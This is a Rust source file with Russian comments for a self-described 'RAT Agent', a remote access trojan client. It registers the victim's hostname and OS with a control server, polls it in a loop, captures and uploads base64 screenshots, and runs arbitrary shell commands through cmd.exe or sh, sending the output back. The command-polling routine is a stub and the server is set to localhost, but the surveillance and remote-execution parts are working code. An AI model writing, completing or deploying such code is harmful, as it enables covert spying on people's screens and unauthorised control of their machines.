use chrono::Utc;
use hostname::get as get_hostname;
use reqwest::Client as HttpClient;
use screenshots::Screen;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::{
    env,
    error::Error,
    process::Command,
    time::Duration,
};
use sysinfo::{System, SystemExt};
use tokio::time;
use uuid::Uuid;

// Конфигурация агента
const SERVER_URL: &str = "http://localhost:3000"; // URL сервера управления
const POLL_INTERVAL_SECONDS: u64 = 5; // Интервал опроса сервера

// Структура для скриншота
#[derive(Debug, Serialize, Deserialize)]
struct Screenshot {
    data: String, // base64 encoded
    timestamp: chrono::DateTime<Utc>,
}

// Структура для выполнения команды
#[derive(Debug, Deserialize)]
struct ExecuteCommandRequest {
    command: String,
}

// Структура для результата выполнения команды
#[derive(Debug, Serialize)]
struct CommandResult {
    output: String,
    error: Option<String>,
    exit_code: i32,
}

// Структура для регистрации клиента
#[derive(Debug, Serialize)]
struct RegisterClientRequest {
    hostname: String,
    os_info: String,
}

// Основная структура агента
struct Agent {
    client_id: Option<Uuid>,
    http_client: HttpClient,
    server_url: String,
}

impl Agent {
    // Создать нового агента
    fn new() -> Self {
        let http_client = HttpClient::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .expect("Failed to create HTTP client");

        Self {
            client_id: None,
            http_client,
            server_url: SERVER_URL.to_string(),
        }
    }

    // Регистрация на сервере
    async fn register(&mut self) -> Result<Uuid, Box<dyn Error>> {
        println!("Регистрация на сервере...");

        // Получаем имя хоста
        let hostname = get_hostname()?
            .to_string_lossy()
            .to_string();

        // Получаем информацию о системе
        let mut system = System::new_all();
        system.refresh_all();
        
        let os_info = format!(
            "{} {}",
            system.name().unwrap_or_else(|| "Unknown".into()),
            system.os_version().unwrap_or_else(|| "Unknown".into())
        );

        // Создаем запрос регистрации
        let register_request = RegisterClientRequest {
            hostname,
            os_info,
        };

        // Отправляем запрос на сервер
        let response = self.http_client
            .post(&format!("{}/api/clients/register", self.server_url))
            .json(&register_request)
            .send()
            .await?;

        // Обрабатываем ответ
        let json: serde_json::Value = response.json().await?;
        let client_id = json["id"].as_str()
            .ok_or("Missing client ID in response")?;
            
        let client_id = Uuid::parse_str(client_id)?;
        println!("Успешно зарегистрирован с ID: {}", client_id);
        
        Ok(client_id)
    }

    // Отправка ping на сервер
    async fn ping(&self) -> Result<(), Box<dyn Error>> {
        if let Some(client_id) = self.client_id {
            self.http_client
                .post(&format!("{}/api/clients/{}/ping", self.server_url, client_id))
                .send()
                .await?;
        }
        Ok(())
    }

    // Проверка наличия команд для выполнения
    async fn check_for_commands(&self) -> Result<(), Box<dyn Error>> {
        // В реальном приложении здесь был бы код для проверки новых команд с сервера
        // Например, через WebSocket или HTTP long polling
        
        // В данном примере это не реализовано, т.к. нам нужен бы отдельный эндпоинт на сервере
        Ok(())
    }

    // Выполнение команды
    async fn execute_command(&self, command: &str) -> Result<CommandResult, Box<dyn Error>> {
        println!("Выполнение команды: {}", command);
        
        // Определяем, какую оболочку использовать в зависимости от ОС
        let (shell, flag) = if cfg!(target_os = "windows") {
            ("cmd.exe", "/C")
        } else {
            ("sh", "-c")
        };
        
        // Выполняем команду
        let output = Command::new(shell)
            .arg(flag)
            .arg(command)
            .output()?;
        
        // Обрабатываем результат
        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = if output.stderr.is_empty() {
            None
        } else {
            Some(String::from_utf8_lossy(&output.stderr).to_string())
        };
        
        let result = CommandResult {
            output: stdout,
            error: stderr,
            exit_code: output.status.code().unwrap_or(-1),
        };
        
        // В реальном приложении здесь был бы код для отправки результата на сервер
        if let Some(client_id) = self.client_id {
            self.http_client
                .post(&format!("{}/api/clients/{}/command-result", self.server_url, client_id))
                .json(&result)
                .send()
                .await?;
        }
        
        Ok(result)
    }

    // Создание и отправка скриншота
    async fn send_screenshot(&self) -> Result<(), Box<dyn Error>> {
        println!("Создание и отправка скриншота...");
        
        // Получаем все доступные экраны
        let screens = Screen::all()?;
        
        // Если есть хотя бы один экран
        if let Some(screen) = screens.first() {
            // Делаем скриншот
            let image = screen.capture()?;
            
            // Сохраняем скриншот во временный буфер
            let mut buffer = Vec::new();
            image.save_with_format(&mut buffer, image::ImageFormat::Jpeg)?;
            
            // Кодируем в base64
            let base64_image = base64::encode(&buffer);
            
            // Создаем объект скриншота
            let screenshot = Screenshot {
                data: base64_image,
                timestamp: Utc::now(),
            };
            
            // Отправляем на сервер
            if let Some(client_id) = self.client_id {
                self.http_client
                    .post(&format!("{}/api/clients/{}/screenshot", self.server_url, client_id))
                    .json(&screenshot)
                    .send()
                    .await?;
                
                println!("Скриншот успешно отправлен");
            }
        } else {
            println!("Не удалось найти доступные экраны");
        }
        
        Ok(())
    }

    // Основной цикл работы агента
    async fn run(&mut self) -> Result<(), Box<dyn Error>> {
        // Регистрация на сервере
        self.client_id = Some(self.register().await?);
        
        // Основной цикл
        loop {
            // Отправляем ping
            if let Err(e) = self.ping().await {
                println!("Ошибка при отправке ping: {}", e);
            }
            
            // Проверяем наличие новых команд
            if let Err(e) = self.check_for_commands().await {
                println!("Ошибка при проверке команд: {}", e);
            }
            
            // Задержка перед следующей итерацией
            time::sleep(Duration::from_secs(POLL_INTERVAL_SECONDS)).await;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    println!("RAT Agent запущен");
    
    // Создаем и запускаем агента
    let mut agent = Agent::new();
    
    // Обрабатываем аргументы командной строки
    let args: Vec<String> = env::args().collect();
    if args.len() > 1 {
        match args[1].as_str() {
            "screenshot" => {
                // Регистрируемся и отправляем скриншот
                agent.client_id = Some(agent.register().await?);
                agent.send_screenshot().await?;
            }
            "exec" if args.len() > 2 => {
                // Регистрируемся и выполняем команду
                agent.client_id = Some(agent.register().await?);
                let command = &args[2];
                let result = agent.execute_command(command).await?;
                println!("Результат:\n{}", result.output);
                if let Some(ref error) = result.error {
                    println!("Ошибки:\n{}", error);
                }
            }
            _ => {
                // Запускаем основной цикл агента
                agent.run().await?;
            }
        }
    } else {
        // Без аргументов запускаем основной цикл
        agent.run().await?;
    }
    
    Ok(())
}
